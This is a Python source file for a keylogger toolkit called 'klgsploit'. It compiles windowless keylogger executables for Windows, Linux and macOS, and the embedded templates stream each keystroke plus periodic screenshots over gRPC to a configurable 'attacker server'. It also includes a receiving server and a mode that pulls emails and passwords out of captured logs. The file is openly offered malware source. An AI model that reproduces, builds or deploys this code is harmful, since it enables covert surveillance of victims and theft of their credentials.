import sys
import os

# Add parent directory to path so we can import libs
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    import PyInstaller.__main__ as pyinstaller
except Exception:
    pyinstaller = None  # PyInstaller may not be installed at runtime; only required for build steps

from libs import *

class KlgMalware:
    def __init__(self, output_dir, script, filename, extention, configs, pltfrm):
        self.pltfrm = pltfrm
        self.output_dir = output_dir
        self.script = script
        self.filename = filename
        self.extention = extention
        self.configs = configs

    def build_standard(self):
        if pyinstaller is None:
            print("[!] PyInstaller is not installed. Please install it to build the executable.")
            return False

        output_path = f"{self.output_dir}/{self.filename}.{self.extention}"

        import tempfile
        import os
        
        temp_script_path = os.path.join(tempfile.gettempdir(), f"klg_temp_{self.pltfrm}.py")
        with open(temp_script_path, 'w') as f:
            f.write(self.script)

        pyinstaller_args = [
            '--onefile',
            '--noconsole',
            '--name', f"{self.filename}",
            '--distpath', f"{self.output_dir}",
            '--workpath', 'build_temp',
            '--specpath', 'build_spec',
            '--clean',
            '--log-level=WARN',
            temp_script_path,
        ]

        try:
            pyinstaller.run(pyinstaller_args)
            print(f"[+] Executable built successfully at: {output_path}")
            if os.path.exists(temp_script_path):
                os.remove(temp_script_path)
            return True
        except Exception as e:
            print(f"[!] Build failed: {e}")
            if os.path.exists(temp_script_path):
                os.remove(temp_script_path)
            return False

    def build_advanced(self):
        """Build executable with advanced features (gRPC, screenshots, intervals)"""
        if pyinstaller is None:
            print("[!] PyInstaller is not installed. Please install it to build the executable.")
            return False

        output_path = f"{self.output_dir}/{self.filename}.{self.extention}"

        import tempfile
        import os
        
        temp_script_path = os.path.join(tempfile.gettempdir(), f"klg_adv_temp_{self.pltfrm}.py")
        with open(temp_script_path, 'w') as f:
            f.write(self.script)

        pyinstaller_args = [
            '--onefile',
            '--noconsole',
            '--name', f"{self.filename}",
            '--distpath', f"{self.output_dir}",
            '--workpath', 'build_temp',
            '--specpath', 'build_spec',
            '--clean',
            '--log-level=WARN',
            '--hidden-import=grpc',
            '--hidden-import=grpc._channel',
            temp_script_path,
        ]

        try:
            pyinstaller.run(pyinstaller_args)
            print(f"[+] Advanced executable built successfully at: {output_path}")
            if os.path.exists(temp_script_path):
                os.remove(temp_script_path)
            return True
        except Exception as e:
            print(f"[!] Build failed: {e}")
            if os.path.exists(temp_script_path):
                os.remove(temp_script_path)
            return False


# define functions depending on OS
def get_platform():
    import platform
    os_name = platform.system().lower()
    if 'windows' in os_name:
        return 'win'
    elif 'linux' in os_name:
        return 'lnx'
    elif 'darwin' in os_name:
        return 'mac'
    else:
        return 'unknown'
    
platform = get_platform()

def getCurrentUsecase():
    args = sys.argv
    if '--start' in args:
        return '1'
    elif '--serve' in args:
        return 'start_server'
    elif '--build' in args:
        return '3'
    elif '--build-adv' in args:
        return '3_advanced'
    elif '--classify' in args:
        return '4'
    elif '--screenshot' in args:
        return '5'
    else:
        return 'help'

usecase = getCurrentUsecase()

# ============================================
# ARGUMENT PARSING HELPERS
# ============================================
def parse_arg(prefix):
    for arg in sys.argv:
        if arg.startswith(prefix + ':'):
            return arg.split(':', 1)[1]
    return None

def get_output_dir():
    return parse_arg('--output') or parse_arg('-output') or './dist'

def get_filename():
    return parse_arg('-fname') or parse_arg('--fname') or 'klgsploit_payload'

def get_extention():
    return parse_arg('extention') or 'exe' if parse_arg('platform') == 'win' else 'out'

def get_target_platform():
    return parse_arg('platform') or platform

def get_host():
    return parse_arg('host') or 'localhost'

def get_port():
    return parse_arg('port') or '50051'

def get_screenshot_interval():
    return int(parse_arg('--screenshot-interval') or '60')

def get_logfile_interval():
    return int(parse_arg('--logfile-interval') or '30')

def get_input_file():
    return parse_arg('input') or 'keylog.txt'

# ============================================
# SCRIPT TEMPLATES FOR EACH PLATFORM
# ============================================

# --- WINDOWS SCRIPTS ---
SCRIPT_WIN_STANDARD = '''
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from libs.winlog import loggerFunction as loggerFunctionWindows

def main():
    print("[*] Starting Windows keylogger...")
    loggerFunctionWindows()

if __name__ == "__main__":
    main()
'''

# FIX: use cln.configure() so the right server is targeted,
#      pass grpc_sender= into loggerFunction so on_press actually sends,
#      and add .png extension to screenshot filenames.
SCRIPT_WIN_ADVANCED_TEMPLATE = '''
import sys
import os
import threading
import time
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from libs.winlog import loggerFunction as loggerFunctionWindows
from libs import cln
from libs.capture import take_screenshot

# Configuration
GRPC_HOST = "{host}"
GRPC_PORT = {port}
SCREENSHOT_INTERVAL = {screenshot_interval}

# Point the gRPC client at the attacker server
cln.configure(GRPC_HOST, GRPC_PORT)

def screenshot_loop():
    """Take screenshots at regular intervals."""
    while True:
        try:
            fname = f"sc_{{int(time.time())}}.png"
            take_screenshot(platform='win', folder='./screenshots', filename=fname)
        except Exception:
            pass
        time.sleep(SCREENSHOT_INTERVAL)

def main():
    screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
    screenshot_thread.start()

    # Pass cln.send_key_non_blocking as grpc_sender so every key press
    # is forwarded to the attacker server directly from on_press().
    loggerFunctionWindows(grpc_sender=cln.send_key_non_blocking)

if __name__ == "__main__":
    main()
'''

# --- LINUX SCRIPTS ---
SCRIPT_LNX_STANDARD = '''
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from libs.linlog import loggerFunction as loggerFunctionLinux

def main():
    print("[*] Starting Linux keylogger...")
    loggerFunctionLinux()

if __name__ == "__main__":
    main()
'''

SCRIPT_LNX_ADVANCED_TEMPLATE = '''
import sys
import os
import threading
import time
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from libs.linlog import loggerFunction as loggerFunctionLinux
from libs import cln
from libs.capture import take_screenshot

# Configuration
GRPC_HOST = "{host}"
GRPC_PORT = {port}
SCREENSHOT_INTERVAL = {screenshot_interval}

# Point the gRPC client at the attacker server
cln.configure(GRPC_HOST, GRPC_PORT)

def screenshot_loop():
    """Take screenshots at regular intervals."""
    while True:
        try:
            fname = f"sc_{{int(time.time())}}.png"
            take_screenshot(platform='lnx', folder='./screenshots', filename=fname)
        except Exception:
            pass
        time.sleep(SCREENSHOT_INTERVAL)

def main():
    screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
    screenshot_thread.start()

    loggerFunctionLinux(grpc_sender=cln.send_key_non_blocking)

if __name__ == "__main__":
    main()
'''

# --- MACOS SCRIPTS ---
SCRIPT_MAC_STANDARD = '''
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from libs.maclog import loggerFunction as loggerFunctionMac

def main():
    print("[*] Starting macOS keylogger...")
    loggerFunctionMac()

if __name__ == "__main__":
    main()
'''

SCRIPT_MAC_ADVANCED_TEMPLATE = '''
import sys
import os
import threading
import time
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from libs.maclog import loggerFunction as loggerFunctionMac
from libs import cln
from libs.capture import take_screenshot

# Configuration
GRPC_HOST = "{host}"
GRPC_PORT = {port}
SCREENSHOT_INTERVAL = {screenshot_interval}

# Point the gRPC client at the attacker server
cln.configure(GRPC_HOST, GRPC_PORT)

def screenshot_loop():
    """Take screenshots at regular intervals."""
    while True:
        try:
            fname = f"sc_{{int(time.time())}}.png"
            take_screenshot(platform='mac', folder='./screenshots', filename=fname)
        except Exception:
            pass
        time.sleep(SCREENSHOT_INTERVAL)

def main():
    screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
    screenshot_thread.start()

    loggerFunctionMac(grpc_sender=cln.send_key_non_blocking)

if __name__ == "__main__":
    main()
'''

# ============================================
# MAIN EXECUTION LOGIC
# ============================================

def print_banner():
    banner = """
   ▄█   ▄█▄  ▄█          ▄██████▄     ▄████████    ▄███████▄  ▄█        ▄██████▄   ▄█      ███     
  ███ ▄███▀ ███         ███    ███   ███    ███   ███    ███ ███       ███    ███ ███  ▀█████████▄ 
  ███▐██▀   ███         ███    █▀    ███    █▀    ███    ███ ███       ███    ███ ███▌    ▀███▀▀██ 
 ▄█████▀    ███        ▄███          ███          ███    ███ ███       ███    ███ ███▌     ███   ▀ 
▀▀█████▄    ███       ▀▀███ ████▄  ▀███████████ ▀█████████▀  ███       ███    ███ ███▌     ███     
  ███▐██▄   ███         ███    ███          ███   ███        ███       ███    ███ ███      ███     
  ███ ▀███▄ ███▌    ▄   ███    ███    ▄█    ███   ███        ███▌    ▄ ███    ███ ███      ███     
  ███   ▀█▀ █████▄▄██   ████████▀   ▄████████▀   ▄████▀      █████▄▄██  ▀██████▀  █▀      ▄████▀   
  ▀         ▀                                                ▀                                     
    """
    print(banner)
    print("  by pengux8 (aka) wail sari bey and contributors")
    print("  - Anes Ragoub | Ines Allag | Amani Sahraoui\n")

def print_help():
    print_banner()
    help_text = """
Keylogger toolkit (dependencies):
    pip install pynput pillow mss grpcio grpcio-tools pyinstaller

Usage:
    Help message:
        python klgsploit_cli.py --help

    Usage 1 - Start keylogger locally:
        python klgsploit_cli.py --start

    Usage 2 - Start attacker server only:
        python klgsploit_cli.py --serve host:<host> port:<port_number>

    Usage 3 - Generate standard executable:
        python klgsploit_cli.py --build platform:<win/lnx/mac> --output:<directory> -fname:<filename> extention:<exe/out/app>

    Usage 3 Advanced - Generate executable with gRPC & screenshots:
        python klgsploit_cli.py --build-adv platform:<win/lnx/mac> --output:<directory> -fname:<filename> extention:<exe/out/app> host:<host> port:<port> --screenshot-interval:<seconds>

    Usage 4 - Classify log file (extract emails/passwords):
        python klgsploit_cli.py --classify input:<path_to_logfile>

    Usage 5 - Take screenshot:
        python klgsploit_cli.py --screenshot platform:<win/lnx/mac> --output:<directory> -fname:<filename>
"""
    print(help_text)

def run_start():
    """Start keylogger on current platform"""
    print(f"[*] Starting keylogger on platform: {platform}")
    if platform == 'win':
        loggerFunctionWindows()
    elif platform == 'lnx':
        loggerFunctionLinux()
    elif platform == 'mac':
        loggerFunctionMac()
    else:
        print(f"[!] Unsupported platform: {platform}")

def run_serve():
    """Start gRPC server"""
    host = get_host()
    port = get_port()
    print(f"[*] Starting gRPC server on {host}:{port}")
    server = KeylogServer()
    server.serve(host=host, port=int(port))

def run_build_standard():
    target = get_target_platform()
    output_dir = get_output_dir()
    filename = get_filename()
    ext = get_extention()
    
    print(f"[*] Building standard executable for platform: {target}")
    print(f"    Output: {output_dir}/{filename}.{ext}")
    
    if target == 'win':
        script = SCRIPT_WIN_STANDARD
    elif target == 'lnx':
        script = SCRIPT_LNX_STANDARD
    elif target == 'mac':
        script = SCRIPT_MAC_STANDARD
    else:
        print(f"[!] Unsupported target platform: {target}")
        return
    
    malware = KlgMalware(
        output_dir=output_dir,
        script=script,
        filename=filename,
        extention=ext,
        configs={},
        pltfrm=target
    )
    malware.build_standard()

def run_build_advanced():
    target = get_target_platform()
    output_dir = get_output_dir()
    filename = get_filename()
    ext = get_extention()
    host = get_host()
    port = get_port()
    screenshot_interval = get_screenshot_interval()
    
    print(f"[*] Building advanced executable for platform: {target}")
    print(f"    Output: {output_dir}/{filename}.{ext}")
    print(f"    gRPC Server: {host}:{port}")
    print(f"    Screenshot interval: {screenshot_interval}s")
    
    if target == 'win':
        script = SCRIPT_WIN_ADVANCED_TEMPLATE.format(
            host=host, port=port, screenshot_interval=screenshot_interval
        )
    elif target == 'lnx':
        script = SCRIPT_LNX_ADVANCED_TEMPLATE.format(
            host=host, port=port, screenshot_interval=screenshot_interval
        )
    elif target == 'mac':
        script = SCRIPT_MAC_ADVANCED_TEMPLATE.format(
            host=host, port=port, screenshot_interval=screenshot_interval
        )
    else:
        print(f"[!] Unsupported target platform: {target}")
        return
    
    malware = KlgMalware(
        output_dir=output_dir,
        script=script,
        filename=filename,
        extention=ext,
        configs={'host': host, 'port': port, 'screenshot_interval': screenshot_interval},
        pltfrm=target
    )
    malware.build_advanced()

def run_classify():
    input_file = get_input_file()
    print(f"[*] Classifying log file: {input_file}")
    
    import re
    
    email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    password_patterns = [
        r'(?:password|passwd|pwd|pass)[:\s=]+([^\s\n]+)',
        r'(?:mot de passe|mdp)[:\s=]+([^\s\n]+)',
    ]
    
    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        emails = set(re.findall(email_pattern, content, re.IGNORECASE))
        
        passwords = set()
        for pattern in password_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            passwords.update(matches)
        
        print("\n[+] Emails found:")
        for email in emails:
            print(f"    {email}")
        
        print("\n[+] Potential passwords found:")
        for pwd in passwords:
            print(f"    {pwd}")
            
    except FileNotFoundError:
        print(f"[!] File not found: {input_file}")
    except Exception as e:
        print(f"[!] Error reading file: {e}")

def run_screenshot():
    target = get_target_platform()
    output_dir = get_output_dir()
    filename = get_filename()
    
    print(f"[*] Taking screenshot on platform: {target}")
    print(f"    Output: {output_dir}/{filename}.png")
    
    try:
        global_screencapture(platform=target, folder=output_dir, filename=filename)
        print(f"[+] Screenshot saved successfully!")
    except Exception as e:
        print(f"[!] Screenshot failed: {e}")

# ============================================
# MAIN ENTRY POINT
# ============================================

if __name__ == "__main__":
    if usecase == 'help':
        print_help()
    elif usecase == '1':
        print_banner()
        run_start()
    elif usecase == 'start_server':
        print_banner()
        run_serve()
    elif usecase == '3':
        print_banner()
        run_build_standard()
    elif usecase == '3_advanced':
        print_banner()
        run_build_advanced()
    elif usecase == '4':
        print_banner()
        run_classify()
    elif usecase == '5':
        print_banner()
        run_screenshot()
    else:
        print_help()